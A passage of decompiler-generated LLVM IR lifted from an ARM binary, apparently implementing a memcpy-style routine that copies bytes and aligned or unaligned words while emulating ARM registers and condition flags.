  %v0_157c8 = phi i32 [ %v1_15790, %dec_label_pc_15790 ], [ %v0_157c8.pre, %bb137 ]
  %v1_157c8 = add i32 %v0_157c8, 20
  store i32 %v1_157c8, i32* %r2.global-to-local, align 4
  %v3_157c8 = sub i32 0, %v0_157c8
  %v4_157c8 = and i32 %v1_157c8, %v3_157c8
  %v5_157c8 = icmp slt i32 %v4_157c8, 0
  store i1 %v5_157c8, i1* %cpsr_v.global-to-local, align 1
  %v6_157c8 = icmp slt i32 %v1_157c8, 0
  store i1 %v6_157c8, i1* %cpsr_n.global-to-local, align 1
  %v7_157c8 = icmp eq i32 %v1_157c8, 0
  store i1 %v7_157c8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %.thread115, %dec_label_pc_157c8
  %v0_157dc.pre157 = phi i32 [ %v0_157dc.pre, %.thread115 ], [ %v1_157c8, %dec_label_pc_157c8 ]
  %v3_157d0 = phi i32 [ %v3_157d099116, %.thread115 ], [ %v3_157d0101, %dec_label_pc_157c8 ]
  %v1_157d4 = phi i1 [ %v1_157d8, %.thread115 ], [ %v5_157c8, %dec_label_pc_157c8 ]
  %v0_157d4 = phi i1 [ %v0_157d8, %.thread115 ], [ %v6_157c8, %dec_label_pc_157c8 ]
  %v2_157cc = xor i1 %v1_157d4, %v0_157d4
  br i1 %v2_157cc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_157cc
  %v3_157cc = load i32, i32* @r1, align 4
  %v4_157cc = inttoptr i32 %v3_157cc to i32*
  %v5_157cc = load i32, i32* %v4_157cc, align 4
  store i32 %v5_157cc, i32* @r3, align 4
  %v6_157cc = add i32 %v3_157cc, 4
  %v7_157cc = inttoptr i32 %v6_157cc to i32*
  %v8_157cc = load i32, i32* %v7_157cc, align 4
  store i32 %v8_157cc, i32* @ip, align 4
  %v9_157cc = add i32 %v3_157cc, 8
  %v10_157cc = inttoptr i32 %v9_157cc to i32*
  %v11_157cc = load i32, i32* %v10_157cc, align 4
  store i32 %v11_157cc, i32* %lr.global-to-local, align 4
  %v12_157cc = add i32 %v3_157cc, 12
  store i32 %v12_157cc, i32* @r1, align 4
  %v4_157d0 = inttoptr i32 %v3_157d0 to i32*
  store i32 %v5_157cc, i32* %v4_157d0, align 4
  %v6_157d0 = add i32 %v3_157d0, 4
  %v7_157d0 = inttoptr i32 %v6_157d0 to i32*
  %v8_157d0 = load i32, i32* @ip, align 4
  store i32 %v8_157d0, i32* %v7_157d0, align 4
  %v9_157d0 = add i32 %v3_157d0, 8
  %v10_157d0 = inttoptr i32 %v9_157d0 to i32*
  %v11_157d0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_157d0, i32* %v10_157d0, align 4
  %v12_157d0 = add i32 %v3_157d0, 12
  store i32 %v12_157d0, i32* @r0, align 4
  %v3_157d4 = load i32, i32* %r2.global-to-local, align 4
  %v4_157d4 = add i32 %v3_157d4, -12
  store i32 %v4_157d4, i32* %r2.global-to-local, align 4
  %v6_157d4 = sub i32 11, %v3_157d4
  %v7_157d4 = and i32 %v6_157d4, %v3_157d4
  %v8_157d4 = icmp slt i32 %v7_157d4, 0
  store i1 %v8_157d4, i1* %cpsr_v.global-to-local, align 1
  %v9_157d4 = icmp slt i32 %v4_157d4, 0
  store i1 %v9_157d4, i1* %cpsr_n.global-to-local, align 1
  %v10_157d4 = icmp eq i32 %v3_157d4, 12
  store i1 %v10_157d4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_157cc, %bb138
  %v0_157dc.pre = phi i32 [ %v4_157d4, %bb138 ], [ %v0_157dc.pre157, %dec_label_pc_157cc ]
  %v3_157d099116 = phi i32 [ %v12_157d0, %bb138 ], [ %v3_157d0, %dec_label_pc_157cc ]
  %v1_157d8 = phi i1 [ %v8_157d4, %bb138 ], [ %v1_157d4, %dec_label_pc_157cc ]
  %v0_157d8 = phi i1 [ %v9_157d4, %bb138 ], [ %v0_157d4, %dec_label_pc_157cc ]
  %v2_157d8 = xor i1 %v1_157d8, %v0_157d8
  br i1 %v2_157d8, label %dec_label_pc_157dc, label %dec_label_pc_157cc

dec_label_pc_157dc:                               ; preds = %.thread115, %dec_label_pc_15788
  %v4_157ec = phi i32 [ %v0_157a094, %dec_label_pc_15788 ], [ %v3_157d099116, %.thread115 ]
  %v0_157dc = phi i32 [ %v1_15788, %dec_label_pc_15788 ], [ %v0_157dc.pre, %.thread115 ]
  %v1_157dc = add i32 %v0_157dc, 8
  store i32 %v1_157dc, i32* %r2.global-to-local, align 4
  %v3_157dc = sub i32 0, %v0_157dc
  %v4_157dc = and i32 %v1_157dc, %v3_157dc
  %v5_157dc = icmp slt i32 %v4_157dc, 0
  store i1 %v5_157dc, i1* %cpsr_v.global-to-local, align 1
  %v6_157dc = icmp slt i32 %v1_157dc, 0
  store i1 %v6_157dc, i1* %cpsr_n.global-to-local, align 1
  %v7_157dc = icmp eq i32 %v1_157dc, 0
  store i1 %v7_157dc, i1* %cpsr_z.global-to-local, align 1
  %v2_157e0 = xor i1 %v6_157dc, %v5_157dc
  br i1 %v2_157e0, label %bb140, label %dec_label_pc_157e4

dec_label_pc_157e4:                               ; preds = %dec_label_pc_157dc
  %v1_157e4 = add i32 %v0_157dc, 4
  store i32 %v1_157e4, i32* %r2.global-to-local, align 4
  %v3_157e4 = sub i32 -5, %v0_157dc
  %v4_157e4 = and i32 %v3_157e4, %v1_157dc
  %v5_157e4 = icmp slt i32 %v4_157e4, 0
  store i1 %v5_157e4, i1* %cpsr_v.global-to-local, align 1
  %v6_157e4 = icmp slt i32 %v1_157e4, 0
  store i1 %v6_157e4, i1* %cpsr_n.global-to-local, align 1
  %v7_157e4 = icmp eq i32 %v1_157dc, 4
  store i1 %v7_157e4, i1* %cpsr_z.global-to-local, align 1
  %v2_157e8 = xor i1 %v6_157e4, %v5_157e4
  %v3_157e8 = load i32, i32* @r1, align 4
  %v4_157e8 = inttoptr i32 %v3_157e8 to i32*
  %v5_157e8 = load i32, i32* %v4_157e8, align 4
  store i32 %v5_157e8, i32* @r3, align 4
  %v7_157e8 = add i32 %v3_157e8, 4
  br i1 %v2_157e8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_157e4
  store i32 %v7_157e8, i32* @r1, align 4
  %v5_157ec = inttoptr i32 %v4_157ec to i32*
  store i32 %v5_157e8, i32* %v5_157ec, align 4
  %v6_157ec = load i32, i32* @r0, align 4
  %v7_157ec = add i32 %v6_157ec, 4
  store i32 %v7_157ec, i32* @r0, align 4
  %v0_157fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_157e4
  %v7_157f0 = inttoptr i32 %v7_157e8 to i32*
  %v8_157f0 = load i32, i32* %v7_157f0, align 4
  store i32 %v8_157f0, i32* @ip, align 4
  %v9_157f0 = add i32 %v3_157e8, 8
  store i32 %v9_157f0, i32* @r1, align 4
  %v4_157f4 = inttoptr i32 %v4_157ec to i32*
  store i32 %v5_157e8, i32* %v4_157f4, align 4
  %v6_157f4 = add i32 %v4_157ec, 4
  %v7_157f4 = inttoptr i32 %v6_157f4 to i32*
  %v8_157f4 = load i32, i32* @ip, align 4
  store i32 %v8_157f4, i32* %v7_157f4, align 4
  %v9_157f4 = add i32 %v4_157ec, 8
  store i32 %v9_157f4, i32* @r0, align 4
  %v3_157f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_157f8 = add i32 %v3_157f8, -4
  store i32 %v4_157f8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_157dc, %bb, %dec_label_pc_159ac, %dec_label_pc_15940, %dec_label_pc_158d4, %bb139
  %v0_157fc = phi i32 [ %v0_157fc.pre, %.thread122 ], [ %v2_1584c, %.thread128 ], [ %v1_157dc, %dec_label_pc_157dc ], [ %v2_15770, %bb ], [ %v0_157fc61, %dec_label_pc_159ac ], [ %v0_157fc60, %dec_label_pc_15940 ], [ %v0_157fc59, %dec_label_pc_158d4 ], [ %v4_157f8, %bb139 ]
  %v1_157fc = add i32 %v0_157fc, 4
  store i32 %v1_157fc, i32* %r2.global-to-local, align 4
  %v3_157fc = sub i32 0, %v0_157fc
  %v4_157fc = and i32 %v1_157fc, %v3_157fc
  %v5_157fc = icmp slt i32 %v4_157fc, 0
  store i1 %v5_157fc, i1* %cpsr_v.global-to-local, align 1
  %v6_157fc = icmp slt i32 %v1_157fc, 0
  store i1 %v6_157fc, i1* %cpsr_n.global-to-local, align 1
  %v7_157fc = icmp eq i32 %v1_157fc, 0
  store i1 %v7_157fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_157fc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_15804.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_15800 = load i8*, i8** %stack_var_-8, align 4
  %v4_15800 = ptrtoint i8* %v3_15800 to i32
  store i32 %v4_15800, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_15804 = phi i32 [ %v0_15804.pre, %bb140.bb142_crit_edge ], [ %v8_1576c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_157fc, i32 %v0_15804)
  %v0_15808 = load i32, i32* %r2.global-to-local, align 4
  %v1_15808 = add i32 %v0_15808, -2
  %v3_15808 = sub i32 1, %v0_15808
  %v4_15808 = and i32 %v3_15808, %v0_15808
  %v5_15808 = icmp slt i32 %v4_15808, 0
  store i1 %v5_15808, i1* %cpsr_v.global-to-local, align 1
  %v6_15808 = icmp slt i32 %v1_15808, 0
  store i1 %v6_15808, i1* %cpsr_n.global-to-local, align 1
  %v7_15808 = icmp eq i32 %v0_15808, 2
  store i1 %v7_15808, i1* %cpsr_z.global-to-local, align 1
  %v0_1580c = load i32, i32* @r1, align 4
  %v1_1580c = inttoptr i32 %v0_1580c to i8*
  %v2_1580c = load i8, i8* %v1_1580c, align 1
  %v5_1580c = add i32 %v0_1580c, 1
  store i32 %v5_1580c, i32* %r1.global-to-local, align 4
  %v2_15810 = load i32, i32* @r0, align 4
  %v3_15810 = inttoptr i32 %v2_15810 to i8*
  store i8 %v2_1580c, i8* %v3_15810, align 1
  %v4_15810 = load i32, i32* @r0, align 4
  %v5_15810 = add i32 %v4_15810, 1
  store i32 %v5_15810, i32* %r0.global-to-local, align 4
  %v0_15814 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15814 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15814 = xor i1 %v0_15814, %v1_15814
  br i1 %v2_15814, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15814 = load i32, i32* %r1.global-to-local, align 4
  %v4_15814 = inttoptr i32 %v3_15814 to i8*
  %v5_15814 = load i8, i8* %v4_15814, align 1
  %v8_15814 = add i32 %v3_15814, 1
  store i32 %v8_15814, i32* %r1.global-to-local, align 4
  %v6_15818 = inttoptr i32 %v5_15810 to i8*
  store i8 %v5_15814, i8* %v6_15818, align 1
  %v7_15818 = load i32, i32* %r0.global-to-local, align 4
  %v8_15818 = add i32 %v7_15818, 1
  store i32 %v8_15818, i32* %r0.global-to-local, align 4
  %v1_1581c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1581c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_15820 = phi i32 [ %v8_15818, %bb143 ], [ %v5_15810, %bb142 ]
  %v2_15820 = phi i1 [ %v2_1581c.pre, %bb143 ], [ %v1_15814, %bb142 ]
  %v1_15820 = phi i1 [ %v1_1581c.pre, %bb143 ], [ %v0_15814, %bb142 ]
  %v0_1581c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1581c = xor i1 %v2_15820, %v1_15820
  %v4_1581c = or i1 %v0_1581c, %v3_1581c
  br i1 %v4_1581c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1581c = load i32, i32* %r1.global-to-local, align 4
  %v6_1581c = inttoptr i32 %v5_1581c to i8*
  %v7_1581c = load i8, i8* %v6_1581c, align 1
  %v10_1581c = add i32 %v5_1581c, 1
  store i32 %v10_1581c, i32* %r1.global-to-local, align 4
  %v8_15820 = inttoptr i32 %v7_15820 to i8*
  store i8 %v7_1581c, i8* %v8_15820, align 1
  %v9_15820 = load i32, i32* %r0.global-to-local, align 4
  %v10_15820 = add i32 %v9_15820, 1
  store i32 %v10_15820, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_15824 = load i8*, i8** %stack_var_-8, align 4
  %v3_15824 = ptrtoint i8* %v2_15824 to i32
  store i32 %v3_15824, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1576c)
  %v0_1582c.pre = load i32, i32* @ip, align 4
  %v0_15834.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_15838.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1582c

dec_label_pc_1582c:                               ; preds = %dec_label_pc_15778, %.thread126
  %v2_15838 = phi i32 [ %v1_15760, %dec_label_pc_15778 ], [ %v2_15838.pre, %.thread126 ]
  %v0_15834 = phi i32 [ %v0_15760, %dec_label_pc_15778 ], [ %v0_15834.pre, %.thread126 ]
  %v0_1582c = phi i32 [ %v1_15778, %dec_label_pc_15778 ], [ %v0_1582c.pre, %.thread126 ]
  %v1_1582c = sub i32 4, %v0_1582c
  store i32 %v1_1582c, i32* @ip, align 4
  %v1_15830 = add i32 %v1_1582c, -2
  %v3_15830 = sub i32 1, %v1_1582c
  %v4_15830 = and i32 %v3_15830, %v1_1582c
  %v5_15830 = icmp slt i32 %v4_15830, 0
  store i1 %v5_15830, i1* %cpsr_v.global-to-local, align 1
  %v6_15830 = icmp slt i32 %v1_15830, 0
  store i1 %v6_15830, i1* %cpsr_n.global-to-local, align 1
  %v7_15830 = icmp eq i32 %v1_1582c, 2
  store i1 %v7_15830, i1* %cpsr_z.global-to-local, align 1
  %v1_15834 = inttoptr i32 %v0_15834 to i8*
  %v2_15834 = load i8, i8* %v1_15834, align 1
  %v3_15834 = zext i8 %v2_15834 to i32
  store i32 %v3_15834, i32* @r3, align 4
  %v5_15834 = add i32 %v0_15834, 1
  store i32 %v5_15834, i32* @r1, align 4
  %v3_15838 = inttoptr i32 %v2_15838 to i8*
  store i8 %v2_15834, i8* %v3_15838, align 1
  %v4_15838 = load i32, i32* @r0, align 4
  %v5_15838 = add i32 %v4_15838, 1
  store i32 %v5_15838, i32* @r0, align 4
  %v0_1583c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1583c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1583c = xor i1 %v0_1583c, %v1_1583c
  br i1 %v2_1583c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1582c
  %v3_1583c = load i32, i32* @r1, align 4
  %v4_1583c = inttoptr i32 %v3_1583c to i8*
  %v5_1583c = load i8, i8* %v4_1583c, align 1
  %v6_1583c = zext i8 %v5_1583c to i32
  store i32 %v6_1583c, i32* @r3, align 4
  %v8_1583c = add i32 %v3_1583c, 1
  store i32 %v8_1583c, i32* @r1, align 4
  %v6_15840 = inttoptr i32 %v5_15838 to i8*
  store i8 %v5_1583c, i8* %v6_15840, align 1
  %v7_15840 = load i32, i32* @r0, align 4
  %v8_15840 = add i32 %v7_15840, 1
  store i32 %v8_15840, i32* @r0, align 4
  %v1_15844.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15844.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1582c, %bb145
  %v7_15848 = phi i32 [ %v8_15840, %bb145 ], [ %v5_15838, %dec_label_pc_1582c ]
  %v2_15848 = phi i1 [ %v2_15844.pre, %bb145 ], [ %v1_1583c, %dec_label_pc_1582c ]
  %v1_15848 = phi i1 [ %v1_15844.pre, %bb145 ], [ %v0_1583c, %dec_label_pc_1582c ]
  %v0_15844 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15844 = xor i1 %v2_15848, %v1_15848
  %v4_15844 = or i1 %v0_15844, %v3_15844
  br i1 %v4_15844, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_15844 = load i32, i32* @r1, align 4
  %v6_15844 = inttoptr i32 %v5_15844 to i8*
  %v7_15844 = load i8, i8* %v6_15844, align 1
  %v8_15844 = zext i8 %v7_15844 to i32
  store i32 %v8_15844, i32* @r3, align 4
  %v10_15844 = add i32 %v5_15844, 1
  store i32 %v10_15844, i32* @r1, align 4
  %v8_15848 = inttoptr i32 %v7_15848 to i8*
  store i8 %v7_15844, i8* %v8_15848, align 1
  %v9_15848 = load i32, i32* @r0, align 4
  %v10_15848 = add i32 %v9_15848, 1
  store i32 %v10_15848, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1597c77 = phi i32 [ %v10_15848, %bb146 ], [ %v7_15848, %.thread127 ]
  %v0_1584c = load i32, i32* %r2.global-to-local, align 4
  %v1_1584c = load i32, i32* @ip, align 4
  %v2_1584c = sub i32 %v0_1584c, %v1_1584c
  store i32 %v2_1584c, i32* %r2.global-to-local, align 4
  %v4_1584c = xor i32 %v1_1584c, %v0_1584c
  %v5_1584c = xor i32 %v2_1584c, %v0_1584c
  %v6_1584c = and i32 %v5_1584c, %v4_1584c
  %v7_1584c = icmp slt i32 %v6_1584c, 0
  store i1 %v7_1584c, i1* %cpsr_v.global-to-local, align 1
  %v8_1584c = icmp slt i32 %v2_1584c, 0
  store i1 %v8_1584c, i1* %cpsr_n.global-to-local, align 1
  %v9_1584c = icmp eq i32 %v0_1584c, %v1_1584c
  store i1 %v9_1584c, i1* %cpsr_z.global-to-local, align 1
  %v2_15850 = xor i1 %v8_1584c, %v7_1584c
  br i1 %v2_15850, label %bb140, label %dec_label_pc_15854

dec_label_pc_15854:                               ; preds = %.thread128
  %v0_15854 = load i32, i32* @r1, align 4
  %v1_15854 = urem i32 %v0_15854, 4
  store i32 %v1_15854, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15854 = icmp eq i32 %v1_15854, 0
  store i1 %v2_15854, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_15854 to i2
  br i1 %v2_15854, label %dec_label_pc_15788, label %dec_label_pc_1585c

dec_label_pc_1585c:                               ; preds = %dec_label_pc_15780, %dec_label_pc_15854
  %v0_1597c76 = phi i32 [ %v1_15760, %dec_label_pc_15780 ], [ %v0_1597c77, %dec_label_pc_15854 ]
  %v0_158e4 = phi i32 [ %v2_15770, %dec_label_pc_15780 ], [ %v2_1584c, %dec_label_pc_15854 ]
  %v0_15864.off0 = phi i2 [ %extract.t, %dec_label_pc_15780 ], [ %extract.t131, %dec_label_pc_15854 ]
  %v0_1585c = phi i32 [ %v0_15760, %dec_label_pc_15780 ], [ %v0_15854, %dec_label_pc_15854 ]
  %v1_1585c = and i32 %v0_1585c, -4
  store i32 %v1_1585c, i32* %r1.global-to-local, align 4
  %v1_15860 = inttoptr i32 %v1_1585c to i32*
  %v2_15860 = load i32, i32* %v1_15860, align 4
  store i32 %v2_15860, i32* %lr.global-to-local, align 4
  %v4_15860 = add i32 %v1_1585c, 4
  store i32 %v4_15860, i32* %r1.global-to-local, align 4
  %v1_158dc = add i32 %v0_158e4, -12
  %v3_158dc = sub i32 11, %v0_158e4
  %v4_158dc = and i32 %v3_158dc, %v0_158e4
  %v5_158dc = icmp slt i32 %v4_158dc, 0
  store i1 %v5_158dc, i1* %cpsr_v.global-to-local, align 1
  %v6_158dc = icmp slt i32 %v1_158dc, 0
  store i1 %v6_158dc, i1* %cpsr_n.global-to-local, align 1
  %v7_158dc = icmp eq i32 %v0_158e4, 12
  store i1 %v7_158dc, i1* %cpsr_z.global-to-local, align 1
  %v2_158e0 = xor i1 %v6_158dc, %v5_158dc
  switch i2 %v0_15864.off0, label %dec_label_pc_15870 [
    i2 -1, label %dec_label_pc_15948
    i2 -2, label %dec_label_pc_158dc
  ]

dec_label_pc_15870:                               ; preds = %dec_label_pc_1585c
  br i1 %v2_158e0, label %dec_label_pc_158bc, label %dec_label_pc_15878

dec_label_pc_15878:                               ; preds = %dec_label_pc_15870
  store i32 %v1_158dc, i32* %r2.global-to-local, align 4
  %v3_1587c = load i32, i32* @r4, align 4
  store i32 %v3_1587c, i32* %stack_var_-16, align 4
  %v6_1587c = load i32, i32* @r5, align 4
  store i32 %v6_1587c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15880

dec_label_pc_15880:                               ; preds = %dec_label_pc_15880.dec_label_pc_15880_crit_edge, %dec_label_pc_15878
  %v0_158a4 = phi i32 [ %v12_158a4, %dec_label_pc_15880.dec_label_pc_15880_crit_edge ], [ %v0_1597c76, %dec_label_pc_15878 ]
  %v0_15884 = phi i32 [ %v0_15884.pre, %dec_label_pc_15880.dec_label_pc_15880_crit_edge ], [ %v4_15860, %dec_label_pc_15878 ]
  %v0_15880 = phi i32 [ %v0_15880.pre, %dec_label_pc_15880.dec_label_pc_15880_crit_edge ], [ %v2_15860, %dec_label_pc_15878 ]
  %v3_15880 = udiv i32 %v0_15880, 256
  %v1_15884 = inttoptr i32 %v0_15884 to i32*
  %v2_15884 = load i32, i32* %v1_15884, align 4
  store i32 %v2_15884, i32* %r4.global-to-local, align 4
  %v3_15884 = add i32 %v0_15884, 4
  %v4_15884 = inttoptr i32 %v3_15884 to i32*
  %v5_15884 = load i32, i32* %v4_15884, align 4
  store i32 %v5_15884, i32* %r5.global-to-local, align 4
  %v6_15884 = add i32 %v0_15884, 8
  %v7_15884 = inttoptr i32 %v6_15884 to i32*
  %v8_15884 = load i32, i32* %v7_15884, align 4
  store i32 %v8_15884, i32* %ip.global-to-local, align 4
  %v9_15884 = add i32 %v0_15884, 12
  %v10_15884 = inttoptr i32 %v9_15884 to i32*
  %v11_15884 = load i32, i32* %v10_15884, align 4
  store i32 %v11_15884, i32* %lr.global-to-local, align 4
  %v12_15884 = add i32 %v0_15884, 16
  store i32 %v12_15884, i32* %r1.global-to-local, align 4
  %v4_15888 = mul i32 %v2_15884, 16777216
  %v5_15888 = or i32 %v4_15888, %v3_15880
  store i32 %v5_15888, i32* @r3, align 4
  %v3_1588c = udiv i32 %v2_15884, 256
  %v4_15890 = mul i32 %v5_15884, 16777216
  %v5_15890 = or i32 %v4_15890, %v3_1588c
  store i32 %v5_15890, i32* %r4.global-to-local, align 4
  %v3_15894 = udiv i32 %v5_15884, 256
  %v4_15898 = mul i32 %v8_15884, 16777216
  %v5_15898 = or i32 %v4_15898, %v3_15894
  store i32 %v5_15898, i32* %r5.global-to-local, align 4
  %v3_1589c = udiv i32 %v8_15884, 256
  %v4_158a0 = mul i32 %v11_15884, 16777216
  %v5_158a0 = or i32 %v4_158a0, %v3_1589c
  store i32 %v5_158a0, i32* @ip, align 4
  %v1_158a4 = inttoptr i32 %v0_158a4 to i32*
  store i32 %v5_15888, i32* %v1_158a4, align 4
  %v3_158a4 = add i32 %v0_158a4, 4
  %v4_158a4 = inttoptr i32 %v3_158a4 to i32*
  %v5_158a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_158a4, i32* %v4_158a4, align 4
  %v6_158a4 = add i32 %v0_158a4, 8
  %v7_158a4 = inttoptr i32 %v6_158a4 to i32*
  %v8_158a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_158a4, i32* %v7_158a4, align 4
  %v9_158a4 = add i32 %v0_158a4, 12
  %v10_158a4 = inttoptr i32 %v9_158a4 to i32*
  %v11_158a4 = load i32, i32* @ip, align 4
  store i32 %v11_158a4, i32* %v10_158a4, align 4
  %v12_158a4 = add i32 %v0_158a4, 16
  store i32 %v12_158a4, i32* @r0, align 4
  %v0_158a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_158a8 = add i32 %v0_158a8, -16
  store i32 %v1_158a8, i32* %r2.global-to-local, align 4
  %v3_158a8 = sub i32 15, %v0_158a8
  %v4_158a8 = and i32 %v3_158a8, %v0_158a8
  %v5_158a8 = icmp slt i32 %v4_158a8, 0
  %v6_158a8 = icmp slt i32 %v1_158a8, 0
  %v2_158ac = xor i1 %v6_158a8, %v5_158a8
  br i1 %v2_158ac, label %dec_label_pc_158b0, label %dec_label_pc_15880.dec_label_pc_15880_crit_edge

dec_label_pc_15880.dec_label_pc_15880_crit_edge:  ; preds = %dec_label_pc_15880
  %v0_15880.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15884.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15880

dec_label_pc_158b0:                               ; preds = %dec_label_pc_15880
  %v2_158b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158b0, i32* @r4, align 4
  %v5_158b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_158b0, i32* @r5, align 4
  %v1_158b4 = add i32 %v0_158a8, -4
  store i32 %v1_158b4, i32* %r2.global-to-local, align 4
  %v3_158b4 = add i32 %v0_158a8, 2147483632
  %v4_158b4 = and i32 %v1_158b4, %v3_158b4
  %v5_158b4 = icmp slt i32 %v4_158b4, 0
  store i1 %v5_158b4, i1* %cpsr_v.global-to-local, align 1
  %v6_158b4 = icmp slt i32 %v1_158b4, 0
  store i1 %v6_158b4, i1* %cpsr_n.global-to-local, align 1
  %v7_158b4 = icmp eq i32 %v1_158b4, 0
  store i1 %v7_158b4, i1* %cpsr_z.global-to-local, align 1
  %v2_158b8 = xor i1 %v6_158b4, %v5_158b4
  br i1 %v2_158b8, label %dec_label_pc_158d4, label %dec_label_pc_158bc

dec_label_pc_158bc:                               ; preds = %dec_label_pc_158b0, %dec_label_pc_15870, %dec_label_pc_158bc
  %v1_158c8 = phi i32 [ %v4_158c8, %dec_label_pc_158bc ], [ %v12_158a4, %dec_label_pc_158b0 ], [ %v0_1597c76, %dec_label_pc_15870 ]
  %v0_158bc = load i32, i32* %lr.global-to-local, align 4
  %v3_158bc = udiv i32 %v0_158bc, 256
  store i32 %v3_158bc, i32* %ip.global-to-local, align 4
  %v0_158c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_158c0 = inttoptr i32 %v0_158c0 to i32*
  %v2_158c0 = load i32, i32* %v1_158c0, align 4
  store i32 %v2_158c0, i32* %lr.global-to-local, align 4
  %v4_158c0 = add i32 %v0_158c0, 4
  store i32 %v4_158c0, i32* %r1.global-to-local, align 4
  %v4_158c4 = mul i32 %v2_158c0, 16777216
  %v5_158c4 = or i32 %v4_158c4, %v3_158bc
  store i32 %v5_158c4, i32* @ip, align 4
  %v2_158c8 = inttoptr i32 %v1_158c8 to i32*
  store i32 %v5_158c4, i32* %v2_158c8, align 4
  %v3_158c8 = load i32, i32* @r0, align 4
  %v4_158c8 = add i32 %v3_158c8, 4
  store i32 %v4_158c8, i32* @r0, align 4
  %v0_158cc = load i32, i32* %r2.global-to-local, align 4
  %v1_158cc = add i32 %v0_158cc, -4
  store i32 %v1_158cc, i32* %r2.global-to-local, align 4
  %v3_158cc = sub i32 3, %v0_158cc
  %v4_158cc = and i32 %v3_158cc, %v0_158cc
  %v5_158cc = icmp slt i32 %v4_158cc, 0
  %v6_158cc = icmp slt i32 %v1_158cc, 0
  %v2_158d0 = xor i1 %v6_158cc, %v5_158cc
  br i1 %v2_158d0, label %dec_label_pc_158d4.loopexit, label %dec_label_pc_158bc

dec_label_pc_158d4.loopexit:                      ; preds = %dec_label_pc_158bc
  %v7_158cc = icmp eq i32 %v0_158cc, 4
  store i1 %v5_158cc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_158cc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_158cc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158d4.loopexit, %dec_label_pc_158b0
  %v0_157fc59 = phi i32 [ %v1_158cc, %dec_label_pc_158d4.loopexit ], [ %v1_158b4, %dec_label_pc_158b0 ]
  %v0_158d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_158d4 = add i32 %v0_158d4, -3
  store i32 %v1_158d4, i32* @r1, align 4
  br label %bb140

dec_label_pc_158dc:                               ; preds = %dec_label_pc_1585c
  br i1 %v2_158e0, label %dec_label_pc_15928, label %dec_label_pc_158e4

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158dc
  store i32 %v1_158dc, i32* %r2.global-to-local, align 4
  %v3_158e8 = load i32, i32* @r4, align 4
  store i32 %v3_158e8, i32* %stack_var_-16, align 4
  %v6_158e8 = load i32, i32* @r5, align 4
  store i32 %v6_158e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_158ec

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge, %dec_label_pc_158e4
  %v0_15910 = phi i32 [ %v12_15910, %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge ], [ %v0_1597c76, %dec_label_pc_158e4 ]
  %v0_158f0 = phi i32 [ %v0_158f0.pre, %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge ], [ %v4_15860, %dec_label_pc_158e4 ]
  %v0_158ec = phi i32 [ %v0_158ec.pre, %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge ], [ %v2_15860, %dec_label_pc_158e4 ]
  %v3_158ec = udiv i32 %v0_158ec, 65536
  %v1_158f0 = inttoptr i32 %v0_158f0 to i32*
  %v2_158f0 = load i32, i32* %v1_158f0, align 4
